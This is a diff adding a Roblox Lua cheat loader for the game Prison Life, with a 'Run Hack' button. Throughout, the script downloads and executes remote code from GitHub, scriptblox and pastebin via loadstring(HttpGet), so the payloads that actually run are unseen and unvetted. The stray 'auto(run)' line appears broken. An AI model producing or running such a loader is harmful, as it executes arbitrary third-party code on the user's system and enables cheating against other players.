@@ -1,0 +1,20 @@
+
+local Library = loadstring(Game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/wizard"))()
+
+local PhantomForcesWindow = Library:NewWindow("prison life V2")
+
+local KillingCheats = PhantomForcesWindow:NewSection("Run Hack")
+
+KillingCheats:CreateButton("click", function()
+loadstring(game:HttpGet("https://scriptblox.com/raw/Prison-Life-Prizz-Admin-14511"))()
+
+wait(0.1)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Denverrz/scripts/master/PRISONWARE_v1.3.txt"))()
+
+wait(0.1)
+
+auto(run)
+
+loadstring(game:HttpGet("https://pastebin.com/raw/rTCnY2Yh"))()
+end)
